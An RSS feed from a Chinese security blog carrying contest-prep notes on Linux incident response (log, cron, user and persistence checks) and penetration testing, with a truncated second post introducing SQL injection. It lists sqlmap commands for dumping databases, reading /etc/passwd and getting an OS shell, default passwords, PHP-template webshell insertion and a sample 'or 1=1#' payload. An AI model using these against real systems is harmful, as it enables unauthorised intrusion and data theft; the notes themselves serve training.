<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>无星的小窝</title>
    <link>http://blog.xingxiaowu.cn/</link>
    
    <atom:link href="http://blog.xingxiaowu.cn/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>一个么的前途的弟中弟</description>
    <pubDate>Sat, 06 Jul 2024 15:30:22 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>无星的渗透之旅速成篇（五）-应急</title>
      <link>http://blog.xingxiaowu.cn/2024/07/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%94%EF%BC%89-%E5%BA%94%E6%80%A5/</link>
      <guid>http://blog.xingxiaowu.cn/2024/07/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%94%EF%BC%89-%E5%BA%94%E6%80%A5/</guid>
      <pubDate>Sat, 06 Jul 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-有提示看提示-没提示看网络连接&quot;&gt;&lt;a href=&quot;#1-有提示看提示-没提示看网络连接&quot; class=&quot;headerlink&quot; title=&quot;1.有提示看提示,没提示看网络连接&quot;&gt;&lt;/a&gt;1.有提示看提示,没提示看网络连接&lt;/h1&gt;&lt;p&gt;看网络进程&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -antup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;2-看用户&quot;&gt;&lt;a href=&quot;#2-看用户&quot; class=&quot;headerlink&quot; title=&quot;2.看用户&quot;&gt;&lt;/a&gt;2.看用户&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;3-看定时任务&quot;&gt;&lt;a href=&quot;#3-看定时任务&quot; class=&quot;headerlink&quot; title=&quot;3.看定时任务&quot;&gt;&lt;/a&gt;3.看定时任务&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;crontab -l&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crontab -u 用户&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;4-查看某个时间段文件改动内容&quot;&gt;&lt;a href=&quot;#4-查看某个时间段文件改动内容&quot; class=&quot;headerlink&quot; title=&quot;4.查看某个时间段文件改动内容&quot;&gt;&lt;/a&gt;4.查看某个时间段文件改动内容&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find / -&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; f -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-08-20 00:00&amp;quot;&lt;/span&gt; -a -not -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-08-20 23:59&amp;quot;&lt;/span&gt; 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find / -&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; f -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-11-15 18:00&amp;quot;&lt;/span&gt; -a -not -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-11-15 23:59&amp;quot;&lt;/span&gt; 2&amp;gt;/dev/null | grep /bin | xargs -I &amp;#123;&amp;#125; file &amp;#123;&amp;#125; | grep -v ELF | grep &lt;span class=&quot;string&quot;&gt;&amp;quot;Bourne-Again shell script, ASCII text executable&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;5-查看报错邮件&quot;&gt;&lt;a href=&quot;#5-查看报错邮件&quot; class=&quot;headerlink&quot; title=&quot;5.查看报错邮件&quot;&gt;&lt;/a&gt;5.查看报错邮件&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="1-有提示看提示-没提示看网络连接"><a href="#1-有提示看提示-没提示看网络连接" class="headerlink" title="1.有提示看提示,没提示看网络连接"></a>1.有提示看提示,没提示看网络连接</h1><p>看网络进程</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antup</span><br></pre></td></tr></table></figure><h1 id="2-看用户"><a href="#2-看用户" class="headerlink" title="2.看用户"></a>2.看用户</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><h1 id="3-看定时任务"><a href="#3-看定时任务" class="headerlink" title="3.看定时任务"></a>3.看定时任务</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u 用户</span><br></pre></td></tr></table></figure><h1 id="4-查看某个时间段文件改动内容"><a href="#4-查看某个时间段文件改动内容" class="headerlink" title="4.查看某个时间段文件改动内容"></a>4.查看某个时间段文件改动内容</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -newermt <span class="string">&quot;2021-08-20 00:00&quot;</span> -a -not -newermt <span class="string">&quot;2021-08-20 23:59&quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find / -<span class="built_in">type</span> f -newermt <span class="string">&quot;2021-11-15 18:00&quot;</span> -a -not -newermt <span class="string">&quot;2021-11-15 23:59&quot;</span> 2&gt;/dev/null | grep /bin | xargs -I &#123;&#125; file &#123;&#125; | grep -v ELF | grep <span class="string">&quot;Bourne-Again shell script, ASCII text executable&quot;</span></span><br></pre></td></tr></table></figure><h1 id="5-查看报错邮件"><a href="#5-查看报错邮件" class="headerlink" title="5.查看报错邮件"></a>5.查看报错邮件</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lth /var/spool/mail/</span><br></pre></td></tr></table></figure><h1 id="6-命令篡改"><a href="#6-命令篡改" class="headerlink" title="6.命令篡改"></a>6.命令篡改</h1><p>可以使用busybox</p><h1 id="一些sh"><a href="#一些sh" class="headerlink" title="一些sh"></a>一些sh</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统日志，/var/log/message    secure    auth.log</span></span><br><span class="line"><span class="comment">#搜索所有ssh登录成功的主机</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log |grep <span class="string">&quot;Accepted&quot;</span></span><br><span class="line"><span class="comment">#搜索所有ssh登录失败的主机</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log |grep <span class="string">&quot;Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#统计ssh登录成功的ip的登录次数</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log |grep <span class="string">&quot;Accepted&quot;</span>|grep -o -E <span class="string">&quot;[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;&quot;</span>|<span class="built_in">sort</span> -n |<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br><span class="line"><span class="comment">#统计ip次数</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log|<span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 1|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c |<span class="built_in">sort</span> -nr</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="赣银杯决赛赛前培训"><a href="#赣银杯决赛赛前培训" class="headerlink" title="赣银杯决赛赛前培训"></a>赣银杯决赛赛前培训</h1><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h1 id="一些工具包"><a href="#一些工具包" class="headerlink" title="一些工具包"></a>一些工具包</h1><p>链接：<a href="https://pan.baidu.com/s/1o9EI_azqWyl8PvdL5W2c7Q?pwd=qhtm">https://pan.baidu.com/s/1o9EI_azqWyl8PvdL5W2c7Q?pwd=qhtm</a></p><p>提取码：qhtm</p><p>包括：取证、渗透、漏洞利用工具包、GTFO【提权】、Dictionary【字典】</p><h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p><h1 id="win11"><a href="#win11" class="headerlink" title="win11"></a>win11</h1><p><a href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></p><p>虚拟机下载</p><p>迅雷网盘(试运行阶段，采用迅雷网盘下载，一段时间没啥问题再换掉下面的123pan)</p><p>● 链接：<a href="https://pan.xunlei.com/s/VNx2MzYGQu_V_sykWgMBbTrzA1">https://pan.xunlei.com/s/VNx2MzYGQu_V_sykWgMBbTrzA1</a> 提取码：tgak</p><p>123盘链接郑重申明：123pan现在下载有流量限制（已经开始收割了），需要登录才能下载了，等我找到合适的网盘就换了</p><p>再次申明：不要扫码付费下载，不要扫码付费下载，不要扫码付费下载！！！</p><p>●Windows11 Penetration Suite Toolkit v2.2 (WSL) 【推荐】</p><p>○下载链接：<a href="https://www.123pan.com/s/q59KVv-T4Qpd.html">https://www.123pan.com/s/q59KVv-T4Qpd.html</a> 提取码:wpst</p><p>○文件大小：8.55GB，解压后：23.2GB</p><p>○SHA256：<br>7305DBFFF38EAAD59373C8232EB417F6E996A5E80F379D22688BAC0E7C8CA6A9</p><p>●Windows11 Penetration Suite Toolkit v2.2 (NoWSL) 【无WSL】</p><p>○下载链接：<a href="https://www.123pan.com/s/q59KVv-tvQpd.html">https://www.123pan.com/s/q59KVv-tvQpd.html</a> 提取码:wpst</p><p>○文件大小：7.13 GB，解压后：17.6GB</p><p>○SHA256：<br>D05F8366E1054911AAE885A61D2621786B74CC6050F55A66B90CE4EDD38CFD98</p><h1 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h1><h2 id="运维赛"><a href="#运维赛" class="headerlink" title="运维赛"></a>运维赛</h2><p>被攻击的机器</p><p>登录机器，分析攻击者行为，怎么进来、做了什么更改</p><p>对环境进行修复【攻击者留下的后门、源码本身就存在的漏洞】</p><p>机器一轮一轮地进行检测</p><p>成功加固，得到相应分输【不需要额外提交东西】</p><h2 id="渗透赛"><a href="#渗透赛" class="headerlink" title="渗透赛"></a>渗透赛</h2><p>一台正常的机器【含有漏洞】</p><p>扮演攻击者，从主机发现-&gt;漏洞利用-&gt;获取权限-&gt;权限提升-&gt;获取到flag文件</p><p>flag{xxxxxxx}</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="linux进程排查"><a href="#linux进程排查" class="headerlink" title="linux进程排查"></a>linux进程排查</h2><ul><li>linux网络排查</li><li>linux文件排查<ul><li>1.webshell</li><li>2.写了私钥文件</li><li>3.httpd.conf   conf.d</li><li>4.ls -&gt;  alias ls&#x3D;”ls&gt;&#x2F;dev&#x2F;null”</li><li>5.ps-&gt;ps_bak</li></ul></li></ul><p>思路：</p><pre><code>* 1.tar -czvf www.tar.gz  /var/www/html/*    打包网站直接扔D盾* 2.ls -altS /usr/sbin |* 3.head -30* 4.find   -newermt 2024-01-03   not newermt  找某个时间范围内的* 5.find / -mtime 7 –exec ls –l &#123;&#125; \;找7内修改的* 6.find / -perm –u=s –type f 2&gt;/dev/null找suid* 7.find / -name “.*” –mtime7 –exec –l &#123;&#125; \;    查找隐藏文件* 8.ls直接反弹shell，目标机器ls拷出来，和自己linux机器中的ls进行比对* 9.md5sum ls* 10.diff 1 2 </code></pre><h2 id="linux用户排查"><a href="#linux用户排查" class="headerlink" title="linux用户排查"></a>linux用户排查</h2><pre><code>* 1.可能存在后门用户* 2.grep :0 /etc/passwd* 3.cd /home/test    * a.cat /home/test/.bash_history* b.查看一下家目录有没有奇怪文件* 4.userdel 删除用户* 5.直接到/etc/passwd删除该用户行* 6.cat /etc/passwd | awk -F: &#39;&#123;print $7&#125;&#39; | sort | uniq -c      * 7.查看有sudo权限的用户【权限排查】* a.more /etc/sudoers | egrep -v &quot;^#|^$&quot;* b.grep wheel /etc/group   排查指定组的用户或者指定用户* 8.cat ~/ .bash_history   历史命令</code></pre><h2 id="linux持久化排查"><a href="#linux持久化排查" class="headerlink" title="linux持久化排查"></a>linux持久化排查</h2><pre><code>* 1.crontab -l  列出定时任务* 2./var/spool/cron/crontabs* 3.检测到可疑的定时任务:    * a.crontab -r删除    * b.进到文件，直接删除指定行就可以* 4./etc/rc.d/*   【排查启动项】先runlevel查看一下启动级别    * a.➢ /etc/rc.local    * b.➢ /etc/rc[0-6].d    * c.➢ /etc/inittab</code></pre><h2 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h2><ul><li>1.web服务日志<ul><li>a.apache  nginx    cd &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</li></ul></li><li>2.登录日志<ul><li>a.&#x2F;var&#x2F;log&#x2F;auth.log</li><li>b.&#x2F;var&#x2F;log&#x2F;secure</li><li>c.&#x2F;var&#x2F;log&#x2F;wtmp</li><li>d.排查一下日志里面有没有脚本</li></ul></li><li>3.应用日志<ul><li>a.&#x2F;var&#x2F;log&#x2F;messages：内核及公共消息日志</li><li>b.➢ &#x2F;var&#x2F;log&#x2F;cron：计划任务日志</li><li>c.➢ &#x2F;var&#x2F;log&#x2F;dmesg：系统引导日志</li><li>d.➢ &#x2F;var&#x2F;log&#x2F;maillog：邮件系统日志</li><li>e.➢ &#x2F;var&#x2F;log&#x2F;lastlog：用户登录日志</li><li>f.➢ &#x2F;var&#x2F;log&#x2F;boot.log：记录系统在引导过程中发生的时间</li><li>g.➢ &#x2F;var&#x2F;log&#x2F;secure：用户验证相关的安全性事件</li><li>h.➢ &#x2F;var&#x2F;log&#x2F;wtmp：当前登录用户详细信息</li><li>i.➢ &#x2F;var&#x2F;log&#x2F;btmp：记录失败的的记录</li><li>j.➢ &#x2F;var&#x2F;run&#x2F;utmp：用户登录、注销及系统开、关等事件；</li></ul></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>exploit-suggester</li><li>linuxenum</li></ul><p>直接搜索”linux提权工具、linux系统信息收集”</p><p>LinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p><p>● LinEnum: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><a href="https://github.com/rebootuser/LinEnum"></a></p><p>● LES (Linux Exploit Suggester): <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>● Linux Smart Enumeration: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p>● Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>1.主动<ul><li>a.精准度比较好，直接与目标交互，容易被发现</li></ul></li><li>2.被动<ul><li>a.隐蔽性比较好，第三方交互、精准度较差</li></ul></li></ul><h3 id="端口扫描【-主机探测】"><a href="#端口扫描【-主机探测】" class="headerlink" title="端口扫描【+主机探测】"></a>端口扫描【+主机探测】</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP x.x.x.0/24   探测主机存活</span><br><span class="line">nmap -sS -p- x.x.x.x -Pn  使用syn半开放扫主机【默认存活】【扫全端口】</span><br><span class="line">nmap -sV -A x.x.x.x 21,22,3306,1443   精细探测服务【名称、版本、可能的漏洞】</span><br><span class="line"></span><br><span class="line">arp-scan -l   捕获局域网流量，探测存活主机</span><br><span class="line">arp-scan -l -i eth0 j 监听某张网卡</span><br></pre></td></tr></table></figure><h3 id="敏感文件探测"><a href="#敏感文件探测" class="headerlink" title="敏感文件探测"></a>敏感文件探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.dirsearch</span><br><span class="line">    a.dirsearch -u http://xxx -e * -t 20 -i 200  -x  500 400</span><br><span class="line">    b.--delay 0.7</span><br><span class="line">    c.dirsearch -u http://xxxx -e * -t 200</span><br><span class="line">2.dirb</span><br><span class="line">    a.dirb http://xxxxxx</span><br><span class="line">3.dirbuster(kali有)</span><br><span class="line">    a.字典比较好用，可以结合其他工具指定字典使用</span><br><span class="line">    b./usr/share/wordlists/dirbuster </span><br><span class="line">4.gobuster</span><br><span class="line">5.burpsuite</span><br><span class="line">6.御剑</span><br><span class="line">7.敏感文件</span><br><span class="line">    a.www.zip</span><br><span class="line">    b.index.php.bak</span><br><span class="line">    c.robots.txt</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>工具</p><p>1.通用漏洞扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fscan:   fscan64 -h x.x.x.x</span><br><span class="line">nessus:</span><br><span class="line">awvs:</span><br><span class="line">netsparker:</span><br><span class="line">nmap --script &quot;漏洞检测脚本&quot;</span><br></pre></td></tr></table></figure><p>2.漏洞利用工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a.sqlmap</span><br><span class="line">【get注入】sqlmap -u http://xxxxx?id=sss </span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql --dbs</span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql -D 数据库名 --tables </span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql -D 数据库名 -T 数据表名 --columns</span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql -D 数据库名 -T 数据表名 -C id --dump</span><br><span class="line"></span><br><span class="line">sqlmap -u http://xxxx   --file-read  &quot;/etc/passwd&quot;</span><br><span class="line">sqlmap -u http://xxxx   --os-shell   获取系统权限</span><br><span class="line"></span><br><span class="line">【post注入】输参数之后，burp抓包</span><br><span class="line">右键 save to item/copy to file   保存到本地   1.txt</span><br><span class="line">sqlmap -r 1.txt  --dbs  步骤同上【加载请求包，对其中所有字段进行注入尝试】</span><br><span class="line"></span><br><span class="line">b.wpscan</span><br><span class="line">i.wpscan --url http://xxxxx</span><br></pre></td></tr></table></figure><p>3.弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.root/root</span><br><span class="line">b.admin/admin</span><br><span class="line">c.admin/password123</span><br></pre></td></tr></table></figure><p>获取权限的下一步操作</p><p>1.theme</p><pre><code>a.往主页、或者html、php模板中插入php代码b.访问主页时即可连接shell</code></pre><p>2.文件上传</p><p>3.命令执行漏洞<br>【www-data】</p><pre><code>1.sudo -l 2.find 找一下有没有suid提权3.直接上传linux信息收集工具</code></pre><p>有没有私钥登录，有没有其他用户，有没有其他敏感文件&#x2F;tmp<br>检查crontabs有没有定时任务，内核提权</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E5%BA%94%E6%80%A5/">应急</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/07/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%94%EF%BC%89-%E5%BA%94%E6%80%A5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>赣银杯赛前培训</title>
      <link>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/</link>
      <guid>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/</guid>
      <pubDate>Wed, 26 Jun 2024 12:17:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select password from users where id = &amp;quot;xiaoming&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select password from users where id = &amp;quot;&amp;quot; or 1=1#&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;information_schema&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;schemata&lt;/th&gt;
&lt;th&gt;tables&lt;/th&gt;
&lt;th&gt;columns&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;数据库名&lt;/td&gt;
&lt;td&gt;schema_name&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;表名&lt;/td&gt;
&lt;td&gt;table_schema&lt;/td&gt;
&lt;td&gt;table_name&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字段名&lt;/td&gt;
&lt;td&gt;table_schema&lt;/td&gt;
&lt;td&gt;table_name&lt;/td&gt;
&lt;td&gt;column_name&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;nianji&lt;/p&gt;
&lt;p&gt;liuyi&lt;/p&gt;
&lt;p&gt;name&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select name from nianji.liuyi;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;联合注入&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select id,username,password from users union select 1,2,3;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;xiaoming&lt;/td&gt;
&lt;td&gt;xiaoming&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select password from users where id = &quot;xiaoming&quot;</span><br><span class="line"></span><br><span class="line">select password from users where id = &quot;&quot; or 1=1#&quot; </span><br><span class="line"></span><br><span class="line">information_schema</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>schemata</th><th>tables</th><th>columns</th></tr></thead><tbody><tr><td>数据库名</td><td>schema_name</td><td></td><td></td></tr><tr><td>表名</td><td>table_schema</td><td>table_name</td><td></td></tr><tr><td>字段名</td><td>table_schema</td><td>table_name</td><td>column_name</td></tr></tbody></table><p>nianji</p><p>liuyi</p><p>name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from nianji.liuyi;</span><br></pre></td></tr></table></figure><p>联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 